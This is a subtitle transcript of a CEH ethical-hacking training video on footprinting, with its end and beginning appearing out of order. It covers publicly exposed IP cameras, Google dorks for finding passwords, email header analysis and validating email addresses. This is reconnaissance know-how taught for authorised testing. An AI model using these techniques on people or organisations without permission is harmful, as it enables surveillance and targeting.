00:37:56.397\nSo we don't wanna do that, because\nthey could easily be just building.\n\n791\n00:37:56.397 --> 00:37:58.876\nIP cams that are in\nan elevator some where, but\n\n792\n00:37:58.876 --> 00:38:03.090\nthey could be on someones computer,\nyou never quite know what your gonna get.\n\n793\n00:38:03.090 --> 00:38:05.662\n>> [LAUGH]\n>> It's the russian roulette wheel of\n\n794\n00:38:05.662 --> 00:38:06.410\nIP Cams.\n\n795\n00:38:06.410 --> 00:38:11.352\nSo you get the idea without us potentially\ncreating a violation of several FCC\n\n796\n00:38:11.352 --> 00:38:12.423\nlaws and rules.\n\n797\n00:38:12.423 --> 00:38:16.580\nWe do wanna just make it clear, like\nanything that we've talked about here.\n\n798\n00:38:16.580 --> 00:38:18.256\nA standard disclaimer,\n\n799\n00:38:18.256 --> 00:38:23.779\nyou keep in mind that you are essentially\npeering through somebody elses camera.\n\n800\n00:38:23.779 --> 00:38:27.590\nThey have for whatever reason\nmade it available publicly.\n\n801\n00:38:27.590 --> 00:38:29.480\nThere's an IP that you can get to,\nyou may or\n\n802\n00:38:29.480 --> 00:38:32.950\nmay not be able to control the camera but\nin theory you can watch the feed.\n\n803\n00:38:32.950 --> 00:38:34.671\nYou don't know what you're gonna\nget on the other side of that.\n\n804\n00:38:34.671 --> 00:38:39.091\nSo please don't access these resources\nwhen you have young children around.\n\n805\n00:38:39.091 --> 00:38:43.030\nDon't access these resources at work\nwhere there may be a rule that says\n\n806\n00:38:43.030 --> 00:38:47.458\ninappropriate conduct and inappropriate\ncontent is grounds for firing.\n\n807\n00:38:47.458 --> 00:38:50.830\nYou don't wanna get fired over\nlooking at someone's webcam,\n\n808\n00:38:50.830 --> 00:38:55.370\nbecause they're engaged in activities that\nare not appropriate for the workplace.\n\n809\n00:38:55.370 --> 00:38:59.226\nI go through this stuff all the time\nlooking for access points for clients, and\n\n810\n00:38:59.226 --> 00:39:01.867\nyou would be amazed at the kind\nof stuff you find here.\n\n811\n00:39:01.867 --> 00:39:02.819\nGood and bad, so\n\n812\n00:39:02.819 --> 00:39:07.940\nyou just gotta understand that this is a\nhodgepodge of a million different things.\n\n813\n00:39:07.940 --> 00:39:11.208\nA lot of this is just somebody put\na webcam up on the outside of their house,\n\n814\n00:39:11.208 --> 00:39:12.980\nand-\n>> Didn't understand what they were doing,\n\n815\n00:39:12.980 --> 00:39:14.968\nand-\n>> Didn't bother to change the default\n\n816\n00:39:14.968 --> 00:39:18.763\nsettings, and you could see their front\nyard, and that's about all you see.\n\n817\n00:39:18.763 --> 00:39:24.053\nBut there's building surveillance cameras,\nthere are cameras inside power plants,\n\n818\n00:39:24.053 --> 00:39:28.569\nthere's cameras in research facilities,\nthere's cameras in schools.\n\n819\n00:39:28.569 --> 00:39:31.750\nThere's all sorts of crazy stuff,\nelevators.\n\n820\n00:39:31.750 --> 00:39:35.190\nYeah, you see all sorts of crazy things,\nbut a lot of this is just garbage.\n\n821\n00:39:35.190 --> 00:39:39.770\nBut a lot of it if your looking for that\nspecific information, may be valuable.\n\n822\n00:39:39.770 --> 00:39:42.704\nSo just wanna make sure we're aware\nof that, and we understand that.\n\n823\n00:39:42.704 --> 00:39:46.278\nWe may want to look at Ben\nthrough up in the chat window,\n\n824\n00:39:46.278 --> 00:39:48.549\nspyfu.com is another good site.\n\n825\n00:39:48.549 --> 00:39:52.290\nWe can just take a look at real quick and\ngo up there as we're talking about this.\n\n826\n00:39:52.290 --> 00:39:54.878\nBen, as always thank you for\nthe feedback and the input.\n\n827\n00:39:54.878 --> 00:39:55.850\nSo we'll put that up.\n\n828\n00:39:57.570 --> 00:39:58.070\nAnd good.\n\n829\n00:39:59.390 --> 00:40:02.700\nJames is letting us know\nwhat's on his feed there.\n\n830\n00:40:02.700 --> 00:40:03.271\nAll right.\nSo\n\n831\n00:40:03.271 --> 00:40:08.480\nwe can see here that SpyFu\nis another interesting site.\n\n832\n00:40:08.480 --> 00:40:13.268\nYeah, lets you go out, as you can see,\nand you can use the site and\n\n833\n00:40:13.268 --> 00:40:17.554\nyou can take a look at searches and\npull back information.\n\n834\n00:40:17.554 --> 00:40:22.160\nThere is a variety of these kinds of sites\nthat are available, just a million and\n\n835\n00:40:22.160 --> 00:40:24.377\none things out there that we can find.\n\n836\n00:40:24.377 --> 00:40:28.385\nBut, you know, they are useful, they\nare very helpful for us as we go through\n\n837\n00:40:28.385 --> 00:40:32.148\nthe foot printing methodology to be\nable to understand how to extract and\n\n838\n00:40:32.148 --> 00:40:34.120\naccess this information.\n\n839\n00:40:34.120 --> 00:40:38.190\nThe idea of foot printing, overall, is the\nidea of being able to walk through this 10\n\n840\n00:40:38.190 --> 00:40:43.200\nstep methodology as we've talked about\nmethodically, purposefully going through,\n\n841\n00:40:43.200 --> 00:40:46.070\nlooking for information and\nall the different categories\n\n842\n00:40:46.070 --> 00:40:50.030\nthat it may be available to us and then\nbeing able to aggregate that information.\n\n843\n00:40:50.030 --> 00:40:51.910\nRight.\nTake it, put it together and\n\n844\n00:40:51.910 --> 00:40:53.830\nbeing able to use it in a variety of ways.\n\n845\n00:40:53.830 --> 00:40:56.775\nWe've shown you just a sampling\nof a few things here and\n\n846\n00:40:56.775 --> 00:40:59.143\nthere that can start to open doors for\nyou and\n\n847\n00:40:59.143 --> 00:41:02.749\nlead to other pieces of information\nother tools things like that.\n\n848\n00:41:02.749 --> 00:41:07.155\nAnd you know an ethical hacker there's\nno right and wrong way to get this\n\n849\n00:41:07.155 --> 00:41:11.675\ninformation in the sense that there\ndefinitely is a right and wrong way.\n\n850\n00:41:11.675 --> 00:41:14.627\nWe've talked about that right,\nact ethically, get permission,\n\n851\n00:41:14.627 --> 00:41:17.422\nI'm not speaking about that what\nI mean is there's not right and\n\n852\n00:41:17.422 --> 00:41:19.160\nwrong way to execute the methodology.\n\n853\n00:41:19.160 --> 00:41:21.720\nIf you go out of order, it doesn't matter.\n\n854\n00:41:21.720 --> 00:41:24.050\nThe point is you've got\nto cover all those steps.\n\n855\n00:41:24.050 --> 00:41:27.800\nIf you use the tools we showed you\nversus tools you are familiar with,\n\n856\n00:41:27.800 --> 00:41:29.220\nthere's no right and wrong there.\n\n857\n00:41:29.220 --> 00:41:31.040\nYou're using tools that\nyou're comfortable with.\n\n858\n00:41:31.040 --> 00:41:32.850\nYou want to get the information.\n\n859\n00:41:32.850 --> 00:41:35.600\nSo the idea is that you want\nto execute on the steps.\n\n860\n00:41:35.600 --> 00:41:40.550\nHow you do that in what order for the most\npart, it's fine to do that in any order.\n\n861\n00:41:40.550 --> 00:41:43.050\nWhen we talk about there being\na specific methodology and\n\n862\n00:41:43.050 --> 00:41:44.880\na certain amount of\nsteps that are numbered.\n\n863\n00:41:44.880 --> 00:41:47.060\nI'm going through them with you\njust to give you a sense of that so\n\n864\n00:41:47.060 --> 00:41:48.030\nyou can prepare.\n\n865\n00:41:48.030 --> 00:41:50.520\nAnd study to make sure you\nunderstand those things.\n\n866\n00:41:50.520 --> 00:41:52.064\nIf you're going to plan\non taking the exam,\n\n867\n00:41:52.064 --> 00:41:53.410\nwould always be good to take a look at.\n\n868\n00:41:53.410 --> 00:41:57.670\nAnd want to make sure we know the steps\nand any methodologies we've talked about.\n\n869\n00:41:57.670 --> 00:42:01.180\nSo just enumerating them for\nyou helps you to understand what they are.\n\n870\n00:42:01.180 --> 00:42:04.655\nBut the reality is if you go and\nstart with the email footprinting and\n\n871\n00:42:04.655 --> 00:42:08.785\nthen work backwards to doing some\nsocial media and social engineering\n\n872\n00:42:08.785 --> 00:42:12.005\nfootprinting and exploits, that's fine,\nthere's nothing wrong with that.\n\n873\n00:42:12.005 --> 00:42:15.050\nYou may skip certain steps because\ncertain companies are targets.\n\n874\n00:42:15.050 --> 00:42:17.150\nMay not be exposed in these areas and\n\n875\n00:42:17.150 --> 00:42:20.220\nyou may not find anything of\nvalue that's fine as well.\n\n876\n00:42:20.220 --> 00:42:24.180\nBut what we're saying with\nthe methodology is we wanna make sure\n\n877\n00:42:24.180 --> 00:42:29.180\nthat we know that these are the highlights\nthe keypoints we wanna touch on.\n\n878\n00:42:29.180 --> 00:42:31.810\nSo that we make sure we\ngather this information and\n\n879\n00:42:31.810 --> 00:42:33.732\nthen we're gonna have access to it.\n\n880\n00:42:33.732 --> 00:42:36.965\nAnd then go through those areas\nmethodically in order to gather that\n\n881\n00:42:36.965 --> 00:42:37.709\ninformation.\n\n882\n00:42:37.709 --> 00:42:41.585\nSo we can be better ultimately\nprepared to talk to our customers,\n\n883\n00:42:41.585 --> 00:42:45.950\nexploit the weaknesses that we find\nif we are hacking for real, right?\n\n884\n00:42:45.950 --> 00:42:49.620\nWe want to make sure we can tag\nthose pieces of information,\n\n885\n00:42:49.620 --> 00:42:52.930\ngo back to the customer and say look,\nthese are the ten different weaknesses and\n\n886\n00:42:52.930 --> 00:42:53.980\nrisks we found.\n\n887\n00:42:53.980 --> 00:42:56.700\nA potential hacker will come\nin this door and do this.\n\n888\n00:42:56.700 --> 00:42:59.740\nWe have identified them now we need to go\nand remediate them and mitigate them and\n\n889\n00:42:59.740 --> 00:43:04.000\nthis is what we'd wanna do to be able\nto then better inform those customers.\n\n890\n00:43:04.000 --> 00:43:04.820\n>> All right Adam.\n\n891\n00:43:04.820 --> 00:43:09.550\nVery good look at footprinting and\nreally focusing in on that methodology and\n\n892\n00:43:09.550 --> 00:43:13.150\nmaking sure as we said at the beginning\nputting some kind of method to our madness\n\n893\n00:43:13.150 --> 00:43:15.880\nis not as important that\nwe go in those exact steps.\n\n894\n00:43:15.880 --> 00:43:17.279\n>> Madness to our method.\n\n895\n00:43:17.279 --> 00:43:19.100\n>> Or madness to our method, that's right.\n\n896\n00:43:19.100 --> 00:43:22.540\nAnd just like going down that grocery\nstore, you might go aisle by aisle by\n\n897\n00:43:22.540 --> 00:43:26.690\naisle occasionally get distracted,\nsome really cool things on the end cap.\n\n898\n00:43:26.690 --> 00:43:27.470\nAnd that's okay, right?\n\n899\n00:43:27.470 --> 00:43:31.130\nYou branch off a little bit but having\nthat methodology, at least make sure that\n\n900\n00:43:31.130 --> 00:43:35.150\nyou hit all of the big points and the ones\nthat you need to make sure you get to.\n\n901\n00:43:35.150 --> 00:43:40.190\nSo I appreciate that, good and\nlook at that footprinting methodology.\n\n902\n00:43:40.190 --> 00:43:42.710\nHope everybody out there\nenjoyed watching this one.\n\n903\n00:43:42.710 --> 00:43:45.450\nSigning off for ITProTV, I'm Mike Rodrick.\n\n904\n00:43:45.450 --> 00:43:46.130\n>> I'm Adam Gordon.\n\n905\n00:43:46.130 --> 00:43:48.324\n>> And we'll see you next time.\n\n906\n00:43:48.324 --> 00:43:56.420\n[MUSIC]\n\n",

00:00:16.720\nI'm your host Mike Rodrick.\n\n4\n00:00:16.720 --> 00:00:18.610\nToday we're doing CEH version 9.\n\n5\n00:00:18.610 --> 00:00:21.790\nAnd specifically in this episode\nwe're gonna be wrapping up\n\n6\n00:00:21.790 --> 00:00:24.020\nour conversation about foot printing.\n\n7\n00:00:24.020 --> 00:00:25.260\nYou know we've talked a lot about it,\n\n8\n00:00:25.260 --> 00:00:28.960\nwe've talked about what it is,\nwe've looked at some methodologies.\n\n9\n00:00:28.960 --> 00:00:33.880\nNow we wanna take a look at how that kind\nof fits into penetration testing as well\n\n10\n00:00:33.880 --> 00:00:36.500\nas maybe some counter measures for\nfoot printing.\n\n11\n00:00:36.500 --> 00:00:38.580\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n12\n00:00:38.580 --> 00:00:39.480\nHow you doing Adam?\n\n13\n00:00:39.480 --> 00:00:40.640\n>> I'm good, I'm good.\n\n14\n00:00:40.640 --> 00:00:43.730\nSo I thought we would continue,\nas Mike said, discussing our theme,\n\n15\n00:00:43.730 --> 00:00:45.550\nbut maybe take a slightly\ndifferent approach.\n\n16\n00:00:45.550 --> 00:00:48.670\nEvery so often it's worthwhile\nto take one of these topics,\n\n17\n00:00:48.670 --> 00:00:51.480\nmaybe drill down a little bit more deeply.\n\n18\n00:00:51.480 --> 00:00:54.690\nExplore some areas you may\nnot have as much exposure to.\n\n19\n00:00:54.690 --> 00:00:58.750\nPerhaps haven't used or\ndone these activities before these tools.\n\n20\n00:00:58.750 --> 00:01:02.100\nAnd that way we can spotlight some\nthings that are helpful for you but\n\n21\n00:01:02.100 --> 00:01:04.740\nalso make sure that you have a sense of\n\n22\n00:01:04.740 --> 00:01:08.730\nwhat it may take in the real world\nto look at some of this information.\n\n23\n00:01:08.730 --> 00:01:11.590\nSo, we've done that a little bit in our\nprior episode with some of the show\n\n24\n00:01:11.590 --> 00:01:12.610\nand tell.\n\n25\n00:01:12.610 --> 00:01:15.470\nWe took a look at advance\nGoogle searching,\n\n26\n00:01:15.470 --> 00:01:19.440\ntook a look at the Google hacking\ndatabase, looked at the Shodan browser.\n\n27\n00:01:19.440 --> 00:01:24.840\nYou went off and took a look at a variety\nof things, but what we also want to do is,\n\n28\n00:01:24.840 --> 00:01:27.880\nand I mentioned this as one of\nthe steps in the methodology,\n\n29\n00:01:27.880 --> 00:01:30.940\nwith regards to foot printing\nthe ten step methodology.\n\n30\n00:01:30.940 --> 00:01:34.230\nYou know email foot printing\nis one of those things that\n\n31\n00:01:35.440 --> 00:01:39.590\ncan be relatively straightforward but\nis something that not a lot of people\n\n32\n00:01:39.590 --> 00:01:44.074\nnecessarily even know exists as a thought\nprocess, let alone may be familiar with.\n\n33\n00:01:44.074 --> 00:01:47.560\nYet when we think about email\nfootprinting, we may say, well, we're just\n\n34\n00:01:47.560 --> 00:01:51.500\ngonna send an email, and see if somebody\ngets it, maybe we'll get an email back.\n\n35\n00:01:51.500 --> 00:01:52.340\nWho knows?\n\n36\n00:01:52.340 --> 00:01:55.780\nAnd yeah, that may be part of it, but\nthere's a lot more to email than just,\n\n37\n00:01:55.780 --> 00:01:58.990\ncan I send an email out into space,\nand somebody responds,\n\n38\n00:01:58.990 --> 00:02:00.495\nI know they're a live human being.\n\n39\n00:02:00.495 --> 00:02:04.710\nYo, there's the email header, the\ninformation in the email packet that is\n\n40\n00:02:04.710 --> 00:02:08.070\nsent that essentially tells us a great\ndeal, as we're gonna take a look at here\n\n41\n00:02:08.070 --> 00:02:10.970\nin a minute, about where the email\ncame from, where it may be going to.\n\n42\n00:02:10.970 --> 00:02:14.700\nThere's the body of the email, the message\nitself, which usually contains information\n\n43\n00:02:14.700 --> 00:02:18.160\nthat may be valuable, but\nthat email may be digitally signed.\n\n44\n00:02:18.160 --> 00:02:21.120\nWe may be able to tell\ninformation about the sender and\n\n45\n00:02:21.120 --> 00:02:23.360\nwhat security mechanisms they are using.\n\n46\n00:02:23.360 --> 00:02:24.840\nThat email may be encrypted.\n\n47\n00:02:24.840 --> 00:02:26.520\nWe may not be able to see the email.\n\n48\n00:02:26.520 --> 00:02:31.700\nIt may be encrypted or protected from us,\nusing some sort of cryptographic solution.\n\n49\n00:02:31.700 --> 00:02:35.100\nWe'll be talking about cryptography\nin upcoming episodes later.\n\n50\n00:02:35.100 --> 00:02:37.680\nBut we can take that information and\n\n51\n00:02:37.680 --> 00:02:40.320\nwe can go ahead and\nwe can use the header itself.\n\n52\n00:02:40.320 --> 00:02:42.430\nWe're gonna show you\nhow to get the header.\n\n53\n00:02:42.430 --> 00:02:44.770\nBut then we can go to\nan interesting website, again,\n\n54\n00:02:44.770 --> 00:02:46.490\nfree of charge, publicly available.\n\n55\n00:02:46.490 --> 00:02:47.770\nWe'll tell you where it is and\n\n56\n00:02:47.770 --> 00:02:51.060\nwe can use that header information\nto learn some interesting things.\n\n57\n00:02:51.060 --> 00:02:53.810\nAs Mike found out,\nright before we got on for\n\n58\n00:02:53.810 --> 00:02:56.680\nthis episode, is I was showing him\nwhat we can do and he said, wow,\n\n59\n00:02:56.680 --> 00:03:00.000\nI didn't even realize I could do that,let\nalone that a site like that would exist.\n\n60\n00:03:00.000 --> 00:03:01.490\nSo we're gonna take a look at that.\n\n61\n00:03:01.490 --> 00:03:05.810\nWe're also going to talk a little\nbit about yet another hidden gem.\n\n62\n00:03:05.810 --> 00:03:07.850\nWe should call this the hidden gem show,\nI guess.\n\n63\n00:03:07.850 --> 00:03:10.540\nHidden gem or hidden feature in Google.\n\n64\n00:03:10.540 --> 00:03:14.680\nGoogle is such a massive front end for\nthe web.\n\n65\n00:03:14.680 --> 00:03:16.210\nAnd we often just joke about it.\n\n66\n00:03:16.210 --> 00:03:17.700\nSay, well,\nI'm just gonna go Google that and\n\n67\n00:03:17.700 --> 00:03:20.930\nI'll find everything and you would\nthink a Google is just a search engine.\n\n68\n00:03:20.930 --> 00:03:25.755\nGoogle is definitely just a search engine\nbut it is not just a search engine.\n\n69\n00:03:25.755 --> 00:03:26.490\nAs we all know,\n\n70\n00:03:26.490 --> 00:03:29.950\nit is the search engine, in the sense\nthat it gives us access to everything.\n\n71\n00:03:29.950 --> 00:03:31.790\nBut Google is a ecosystem.\n\n72\n00:03:31.790 --> 00:03:34.270\nIt is a collection of services and tools.\n\n73\n00:03:34.270 --> 00:03:35.910\nWe've explore a couple of them with you.\n\n74\n00:03:35.910 --> 00:03:38.100\nWe've shown you the advance\nsearch feature which you may or\n\n75\n00:03:38.100 --> 00:03:39.730\nmay not have known existed.\n\n76\n00:03:39.730 --> 00:03:43.780\nWe certainly can and indeed will over\nvarious episodes take a look at things\n\n77\n00:03:43.780 --> 00:03:48.510\nlike searching for images, searching for,\nas you saw with google hacks and\n\n78\n00:03:48.510 --> 00:03:51.710\ngoogle dorks being able to go in and\nsearch for search strings.\n\n79\n00:03:51.710 --> 00:03:54.430\nFind passwords as we showed you online.\n\n80\n00:03:54.430 --> 00:03:57.490\nDefault password for\nstatus systems, who knows what.\n\n81\n00:03:57.490 --> 00:03:58.470\nAll sorts of stuff.\n\n82\n00:03:58.470 --> 00:03:59.890\nBut there's a real simple, but\n\n83\n00:03:59.890 --> 00:04:03.680\nyet incredibly important function\nburied in the Google toolkit\n\n84\n00:04:03.680 --> 00:04:06.760\nthat most people don't know about,\nthat I'm going to show you as well.\n\n85\n00:04:06.760 --> 00:04:09.880\nThen we'll take a look at how we can\nleverage that, talk about that and\n\n86\n00:04:09.880 --> 00:04:11.550\nwe're gonna talk a bit about\nsome counter measures.\n\n87\n00:04:11.550 --> 00:04:17.090\nWhat can we do as ethical hackers\ninside of our networks working for\n\n88\n00:04:17.090 --> 00:04:21.300\nthe good side to be able to tell people\nhow to defend against some of this stuff.\n\n89\n00:04:21.300 --> 00:04:25.390\nHow do we prevent them or at least educate\nthem from being able to do some of\n\n90\n00:04:25.390 --> 00:04:28.590\nthe things that lend themselves to\nthese attacks that we've shown you.\n\n91\n00:04:28.590 --> 00:04:30.790\nWe're gonna talk about educating users.\n\n92\n00:04:30.790 --> 00:04:34.460\nAnd I'm gonna walk you through what\na standard pen test may look like\n\n93\n00:04:34.460 --> 00:04:37.310\nfrom the perspective of\ndoing foot printing,\n\n94\n00:04:37.310 --> 00:04:41.890\nput that ten step methodology into\na real world step-by-step scenario.\n\n95\n00:04:41.890 --> 00:04:45.120\nLet's talk about what I would do\nif I was working for a client and\n\n96\n00:04:45.120 --> 00:04:46.460\nhow I would do that.\n\n97\n00:04:46.460 --> 00:04:49.170\nJust break that down so\nyou guys get to see that and\n\n98\n00:04:49.170 --> 00:04:51.920\nmore importantly just hear about it and\nunderstand it.\n\n99\n00:04:51.920 --> 00:04:54.200\nAnd we'll wrap up with\nthat kind of a discussion.\n\n100\n00:04:54.200 --> 00:04:57.050\nSo, if we could, let's start by\nbringing up on Mike's machine,\n\n101\n00:04:57.050 --> 00:05:00.040\nwhat an email header traditionally\nis going to look like.\n\n102\n00:05:00.040 --> 00:05:03.640\nWhen we go grab an email,\nwe're going to be able to, if we\n\n103\n00:05:03.640 --> 00:05:07.950\nuse the proper tools to expose it Mike,\nyou're working on a MacIntosh system.\n\n104\n00:05:07.950 --> 00:05:10.710\n>> Yep.\nI've got an Office, what is it?\n\n105\n00:05:10.710 --> 00:05:11.650\n2011 for Mac.\n\n106\n00:05:11.650 --> 00:05:14.040\n>> Office 2011.\n>> And here what you're doing is you would\n\n107\n00:05:14.040 --> 00:05:18.840\nright click on your email and\nthen go down to view source.\n\n108\n00:05:18.840 --> 00:05:20.760\nAnd that's what exposed\nthis information here.\n\n109\n00:05:20.760 --> 00:05:22.730\n>> Okay.\nAnd it's slightly different depending on\n\n110\n00:05:22.730 --> 00:05:23.820\nthe e-mail client.\n\n111\n00:05:23.820 --> 00:05:28.130\nSo you just want to figure out\nthe specificity of how you localize that\n\n112\n00:05:28.130 --> 00:05:30.100\nconcept to your e-mail client.\n\n113\n00:05:30.100 --> 00:05:31.300\nBut whatever you do,\n\n114\n00:05:31.300 --> 00:05:34.350\nthere should be some information\non how to view the host headers.\n\n115\n00:05:34.350 --> 00:05:38.570\nIf not go out to the web and\njust simply look for that information.\n\n116\n00:05:38.570 --> 00:05:41.120\nHow do I view host headers in Outlook,\nyou know, 2013 or 2016?\n\n117\n00:05:41.120 --> 00:05:42.670\nHow do I view it using Office 365?\n\n118\n00:05:42.670 --> 00:05:46.020\nHow do I view it using Gmail?\n\n119\n00:05:46.020 --> 00:05:48.370\nYou know, whatever the case may be.\n\n120\n00:05:48.370 --> 00:05:51.630\nEvery email system gives you\nthe ability to see a host header.\n\n121\n00:05:51.630 --> 00:05:53.060\nIt's just a matter of how you get to it.\n\n122\n00:05:53.060 --> 00:05:53.920\nCan we zoom in a little bit,\n\n123\n00:05:53.920 --> 00:05:57.800\nI know you've got the host header\nportion highlighted there for us.\n\n124\n00:05:57.800 --> 00:06:00.885\nAnd that's because we have\nthe whole email message v-source.\n\n125\n00:06:00.885 --> 00:06:02.490\nViews everything not just the header.\n\n126\n00:06:02.490 --> 00:06:05.030\nBut what we also have to do is\njust break out the header portion.\n\n127\n00:06:05.030 --> 00:06:07.074\nNow the reason Mike\nhighlight that is two-fold.\n\n128\n00:06:07.074 --> 00:06:10.604\nOne, we need the host header selected for\na tool we're going to demo here for\n\n129\n00:06:10.604 --> 00:06:12.640\nyou in a minute, so he was doing that.\n\n130\n00:06:12.640 --> 00:06:15.900\nBut this also allows us to see what's\nin the host header information.\n\n131\n00:06:15.900 --> 00:06:17.950\nSo maybe, Mike, you can narrate for\nus real quickly,\n\n132\n00:06:17.950 --> 00:06:20.285\njust talk about the received-\n>> Mm-hm.\n\n133\n00:06:20.285 --> 00:06:23.132\n>> And the authentication area,\nthe results, and\n\n134\n00:06:23.132 --> 00:06:27.170\nwhat's there with the SPF information,\nthe signature down below.\n\n135\n00:06:27.170 --> 00:06:28.740\nJust kinda walk us through\nwhat you see there.\n\n136\n00:06:28.740 --> 00:06:31.970\n>> You see a couple different receive\nfroms as it goes through the different\n\n137\n00:06:31.970 --> 00:06:34.510\nemail servers exchange labs, for example.\n\n138\n00:06:34.510 --> 00:06:36.260\nIt shows me their IP address,\n\n139\n00:06:36.260 --> 00:06:40.490\nMicrosoft SMTP Server,\nusing transport layer security.\n\n140\n00:06:40.490 --> 00:06:44.520\nAgain gives you some IP addresses and\nI can see that at some point\n\n141\n00:06:44.520 --> 00:06:49.680\nit bounced through Office 365 dot com\nagain through Microsoft Office NTP.\n\n142\n00:06:49.680 --> 00:06:53.445\nAuthentication results\nare showing SPF pass.\n\n143\n00:06:53.445 --> 00:06:55.745\n>> Now let's stop there for a second.\n\n144\n00:06:55.745 --> 00:06:56.565\nSo two things.\n\n145\n00:06:56.565 --> 00:07:00.045\nNumber one,\nwhat Mike's describing up until now,\n\n146\n00:07:00.045 --> 00:07:03.455\nis we're essentially seeing\nthe chain that that email address is\n\n147\n00:07:03.455 --> 00:07:07.185\npassed through on its way from\nwherever it was sent from to Mike.\n\n148\n00:07:07.185 --> 00:07:10.335\nThis is an email Mike received,\nso Mike got this and\n\n149\n00:07:10.335 --> 00:07:11.845\nit was sent from who knows where.\n\n150\n00:07:11.845 --> 00:07:13.445\nIt doesn't really matter.\n\n151\n00:07:13.445 --> 00:07:15.125\n>> Spring chicken AM.\n\n152\n00:07:15.125 --> 00:07:17.550\n.Twitter.com\n>> There you go.\n\n153\n00:07:17.550 --> 00:07:18.340\nOkay so\n>> [LAUGH]\n\n154\n00:07:18.340 --> 00:07:20.990\n>> Like I said really doesn't matter where\n\n155\n00:07:20.990 --> 00:07:26.000\nit came from but the point is we're\nseeing a history, a historical record\n\n156\n00:07:26.000 --> 00:07:30.450\nof transactions associated with this\nemail that are captured in the header\n\n157\n00:07:30.450 --> 00:07:35.440\nas we parse this email and send it from\nhop to hop through the delivery system.\n\n158\n00:07:35.440 --> 00:07:38.230\nAnd that delivery system can\nliterally span the globe.\n\n159\n00:07:38.230 --> 00:07:41.942\nAnd so we're seeing metadata\nrecord of all of this information,\n\n160\n00:07:41.942 --> 00:07:46.260\nwhich becomes important if we wanna\nknow where the email originates from and\n\n161\n00:07:46.260 --> 00:07:48.704\nwhere it passed through\non its way to Mike.\n\n162\n00:07:48.704 --> 00:07:51.670\nWe're then seeing\nsomething known as the SPF,\n\n163\n00:07:51.670 --> 00:07:56.430\nas you were talking about we had\na [INAUDIBLE] authentication there, right?\n\n164\n00:07:56.430 --> 00:07:57.560\n>> Authentication results, yeah.\n\n165\n00:07:57.560 --> 00:08:00.262\n>> The SPF passed, so we're seeing the.\n\n166\n00:08:00.262 --> 00:08:04.959\nAbility for the sender to be able to\npass a verification test whether or\n\n167\n00:08:04.959 --> 00:08:07.020\nnot this is spam, right.\n\n168\n00:08:07.020 --> 00:08:10.270\nAnd spam confidence level is being\nassessed, and we're seeing whether or\n\n169\n00:08:10.270 --> 00:08:12.920\nnot this email is legitimate and\nshould be filtered or\n\n170\n00:08:12.920 --> 00:08:15.246\nnot as part of that discussion.\n\n171\n00:08:15.246 --> 00:08:16.660\nAnd then we continue down,\n\n172\n00:08:16.660 --> 00:08:20.840\nI know that we have signature item\ndown below there a little but I see.\n\n173\n00:08:20.840 --> 00:08:23.270\nAnd then we've got some\nadditional keys and\n\n174\n00:08:23.270 --> 00:08:25.420\ninformation that looks\nlike at the bottom for X.\n\n175\n00:08:25.420 --> 00:08:27.940\nI can't see at the very bottom there.\n\n176\n00:08:27.940 --> 00:08:30.115\n>> X dash MSFBL.\n\n177\n00:08:30.115 --> 00:08:30.810\n>> MSFBL.\n\n178\n00:08:30.810 --> 00:08:33.930\nOkay, so we're seeing a bunch of\ninformation that tells us what\n\n179\n00:08:33.930 --> 00:08:37.810\nthe digital signature is associated\nwith this particular email.\n\n180\n00:08:37.810 --> 00:08:40.980\nAnd or key information about the email and\nits usage.\n\n181\n00:08:40.980 --> 00:08:43.730\nAnd so we're seeing a lot of very\nuseful information in the header.\n\n182\n00:08:43.730 --> 00:08:45.490\nWhat would a hacker be looking for?\n\n183\n00:08:45.490 --> 00:08:50.130\nThey will be looking for IP addresses,\nthey'd be looking for information about\n\n184\n00:08:50.130 --> 00:08:55.190\nthe path of this email, looking for\nIP address information that can be\n\n185\n00:08:55.190 --> 00:09:00.210\nused to map out email servers, and be\nable to then help us profile the path and\n\n186\n00:09:00.210 --> 00:09:04.410\ntherefore ultimately profile the network\nthat may be used to deliver this email.\n\n187\n00:09:04.410 --> 00:09:07.770\nNow, if we then take that, and\nMike did, he copied that header,\n\n188\n00:09:07.770 --> 00:09:12.160\nso he's done that, and then, we go to\nan interesting website that I told Mike\n\n189\n00:09:12.160 --> 00:09:16.555\nabout called ipaddresslocation.org,\nyou'll get the link for this.\n\n190\n00:09:16.555 --> 00:09:19.010\n>> Mm-hm.\n>> It's a freely available website.\n\n191\n00:09:19.010 --> 00:09:21.900\nWhen you pull this up,\namong the many things you can do, and\n\n192\n00:09:21.900 --> 00:09:24.560\nyou gotta drill down just a little bit and\nsearch around on the website.\n\n193\n00:09:24.560 --> 00:09:29.400\nThere is a bunch of, or there are a bunch\nof ads out there on the website.\n\n194\n00:09:29.400 --> 00:09:30.950\nSo you just wanna kinda navigate through,\n\n195\n00:09:30.950 --> 00:09:33.850\nwe're going down into the middle of\nthe site there, as Mike zoomed in.\n\n196\n00:09:33.850 --> 00:09:35.140\nCan you zoom back in for just a second?\n\n197\n00:09:35.140 --> 00:09:35.680\n>> Mm-hm.\nAnd\n\n198\n00:09:35.680 --> 00:09:39.100\nwe'll see there under\nfree IP location service.\n\n199\n00:09:39.100 --> 00:09:42.550\nYou'll see email lookup,\ntrace email, Whois IP.\n\n200\n00:09:42.550 --> 00:09:45.740\nWe're gonna do, I think we did\nthe email lookup first, right.\n\n201\n00:09:45.740 --> 00:09:47.960\nSo we're gonna maybe open\nthat up separately or\n\n202\n00:09:47.960 --> 00:09:50.610\nyou all ready have it opened, and\nthen we'll come back and do the other one.\n\n203\n00:09:50.610 --> 00:09:53.940\nAnd under email address lookup,\nMike's gonna be able\n\n204\n00:09:53.940 --> 00:09:58.020\nto put in an email address and then see\nwhether it's a valid email address or not.\n\n205\n00:09:58.020 --> 00:10:00.910\nSo he's gonna type in, I think his IP or\n\n206\n00:10:00.910 --> 00:10:04.290\nhis email address rather, and then he's\ngonna go ahead and do email lookup.\n\n207\n00:10:04.290 --> 00:10:07.925\nAnd what we're gonna get back,\ndown towards the bottom of the page,\n\n208\n00:10:07.925 --> 00:10:11.683\nis we're gonna get a report back on\nwhether that email address is a valid\n\n209\n00:10:11.683 --> 00:10:16.190\nemail address, at what organization,\nwhether we can send email to it or not.\n\n210\n00:10:16.190 --> 00:10:19.230\nSo we're able to use this to probe from\n\n211\n00:10:19.230 --> 00:10:23.875\nthe host header pulling IP address\ninformation and email addresses,\n\n212\n00:10:23.875 --> 00:10:27.600\nwe're able to go in and probe the email\naddress and see that it's a valid,\n\n213\n00:10:27.600 --> 00:10:31.930\ndeliverable email address at that\nlocation, meaning we now have 